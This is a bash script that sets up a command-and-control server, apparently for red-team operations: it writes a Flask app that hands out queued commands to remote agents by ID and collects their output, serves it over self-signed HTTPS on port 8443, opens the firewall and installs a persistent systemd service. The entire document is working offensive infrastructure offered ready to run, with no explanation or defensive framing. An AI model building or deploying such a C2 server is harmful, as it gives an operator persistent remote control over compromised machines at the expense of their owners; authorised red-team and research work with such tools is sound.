#!/bin/bash

echo "[*] Updating packages..."
sudo apt update && sudo apt upgrade -y

echo "[*] Installing Python3, pip, and Flask..."
sudo apt install -y python3 python3-pip ufw
pip3 install flask

echo "[*] Creating C2 directory..."
mkdir -p ~/c2_server/certs
cd ~/c2_server

echo "[*] Writing C2 server script..."
cat > server.py << 'EOF'
from flask import Flask, request
import json, os

app = Flask(__name__)
DB_FILE = "task_db.json"

if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w") as f:
        json.dump({}, f)

def load_tasks():
    with open(DB_FILE) as f:
        return json.load(f)

def save_tasks(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f)

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    tasks = load_tasks()
    return tasks.pop(agent_id, "") or ""

@app.route("/result/<agent_id>", methods=["POST"])
def post_result(agent_id):
    print(f"[+] Result from {agent_id}: {request.form['output']}")
    return "OK"

@app.route("/set/<agent_id>", methods=["POST"])
def set_task(agent_id):
    tasks = load_tasks()
    tasks[agent_id] = request.form["task"]
    save_tasks(tasks)
    return "Task set"

if __name__ == "__main__":
    context = ("certs/cert.pem", "certs/key.pem")
    app.run(host="0.0.0.0", port=8443, ssl_context=context)
EOF

echo "[*] Generating self-signed HTTPS certificate..."
openssl req -new -x509 -days 365 -nodes \
    -out certs/cert.pem -keyout certs/key.pem \
    -subj "/C=IN/ST=RedTeam/L=CyberOps/O=C2Project/CN=$(curl -s ifconfig.me)"

echo "[*] Configuring UFW to allow port 8443..."
sudo ufw allow 8443
sudo ufw --force enable

echo "[*] Creating systemd service for C2..."
cat | sudo tee /etc/systemd/system/c2server.service > /dev/null << EOF
[Unit]
Description=Custom C2 Flask Server
After=network.target

[Service]
ExecStart=/usr/bin/python3 /home/ubuntu/c2_server/server.py
WorkingDirectory=/home/ubuntu/c2_server
Restart=always
User=ubuntu

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Enabling and starting C2 service..."
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable c2server
sudo systemctl start c2server

echo "[✔] C2 Server is now running on https://$(curl -s ifconfig.me):8443"
